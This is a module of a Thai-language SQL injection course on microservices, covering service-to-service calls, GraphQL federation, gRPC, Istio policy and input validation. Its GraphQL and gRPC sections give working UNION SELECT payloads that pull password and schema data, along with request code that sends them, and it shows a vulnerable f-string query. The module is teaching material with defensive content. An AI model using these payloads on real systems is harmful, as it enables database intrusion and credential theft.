# Part 057: SQL Injection ใน Microservices

## ภาพรวม

Microservices มีหลาย attack surface ที่แตกต่างจาก monolithic apps

**ขั้นตอนที่ 926-940**

---

## 926. Service-to-Service SQL Injection

```python
import requests

# Internal service call ที่ vulnerable
# Service A -> Service B (user lookup)
# Service B code:
# query = f"SELECT * FROM users WHERE id = {user_id}"

# ถ้า Service A ส่ง user_id โดยไม่ validate:
def get_user_from_service(user_id: str):
    r = requests.get(f'http://user-service/users/{user_id}')
    return r.json()

# ถ้า user_id = "1 UNION SELECT 1,password FROM admin_users--"
# Service A ส่ง user_id ไปให้ Service B
# Service B inject ใน database

# SECURE:
def get_user_secure(user_id: str):
    # Validate ก่อนส่ง
    try:
        user_id = int(user_id)
    except ValueError:
        raise ValueError("Invalid user_id")
    
    r = requests.get(f'http://user-service/users/{user_id}')
    return r.json()
```

---

## 927. GraphQL Federation Injection

```python
import requests

# GraphQL Federation เชื่อมต่อหลายเซอร์วิซ
# Gateway ส่งคำสั่งไปยัง subgraphs

url = 'http://graphql-gateway/graphql'

# Injection ผ่าน federation directive
federation_injection = {
    "query": """
    query {
        _entities(representations: [
            {
                "__typename": "User",
                "id": "1' UNION SELECT 1,password FROM users-- -"
            }
        ]) {
            ... on User {
                id
                email
            }
        }
    }
    """
}

r = requests.post(url, json=federation_injection)
print(r.json())

# Batch query injection:
batch_injection = [
    {"query": "{ user(id: 1) { id } }"},
    {"query": "{ user(id: \"' UNION SELECT 1,table_name,3 FROM information_schema.tables-- -\") { id } }"}
]

r2 = requests.post(url, json=batch_injection)
```

---

## 928. gRPC และ SQL Injection

```python
# gRPC stub ส่ง user-supplied data
import grpc
# import user_pb2, user_pb2_grpc  # generated from .proto

def call_grpc_vulnerable(user_id: str):
    """gRPC call ที่ backend inject ใน SQL"""
    channel = grpc.insecure_channel('user-service:50051')
    # stub = user_pb2_grpc.UserServiceStub(channel)
    # request = user_pb2.GetUserRequest(id=user_id)  # ส่ง as-is
    # response = stub.GetUser(request)
    # Backend: f"SELECT * FROM users WHERE id = '{request.id}'"
    pass

# Injection via gRPC metadata (headers)
import grpc

metadata = [
    ('x-user-id', "1' UNION SELECT 1,password FROM users-- -"),
    ('authorization', 'Bearer valid-token')
]

# channel = grpc.insecure_channel('service:50051')
# stub = service_stub(channel)
# response = stub.Method(request, metadata=metadata)
```

---

## 929. Service Mesh Security

```yaml
# Istio กำหนด policy สำหรับ service-to-service
apiVersion: security.istio.io/v1beta1
kind: AuthorizationPolicy
metadata:
  name: db-access-policy
spec:
  selector:
    matchLabels:
      app: user-service
  rules:
  - from:
    - source:
        principals: ["cluster.local/ns/default/sa/api-gateway"]
    to:
    - operation:
        methods: ["GET", "POST"]
        paths: ["/api/users*"]
```

---

## 930. การป้องกัน ใน Microservices

```python
# Input validation middleware สำหรับทุก service
from functools import wraps
from flask import request, abort
import re

def validate_input(schema: dict):
    """Decorator สำหรับ validate request inputs"""
    def decorator(f):
        @wraps(f)
        def wrapper(*args, **kwargs):
            data = request.get_json() or {}
            
            for field, rules in schema.items():
                value = data.get(field)
                
                if rules.get('required') and value is None:
                    abort(400, f"Missing field: {field}")
                
                if value is not None:
                    if rules.get('type') == 'int':
                        try:
                            data[field] = int(value)
                        except (ValueError, TypeError):
                            abort(400, f"Invalid type for {field}")
                    
                    if 'pattern' in rules:
                        if not re.match(rules['pattern'], str(value)):
                            abort(400, f"Invalid format for {field}")
            
            return f(*args, **kwargs)
        return wrapper
    return decorator

# Usage:
# @app.route('/users', methods=['POST'])
# @validate_input({'user_id': {'required': True, 'type': 'int'}})
# def get_user():
#     ...
```

---

## สรุป

Microservices SQL Injection:
- **Service-to-service** - ต้อง validate ทุก layer
- **GraphQL Federation** - _entities อาจ injectable
- **gRPC metadata** - headers สามารถรับ injection
- **Service mesh** - Istio authz policy
- **Prevention** - validate ทุก service boundary, parameterized everywhere

---

*Part 057 | SQL Injection Course | สำหรับการศึกษาเท่านั้น*
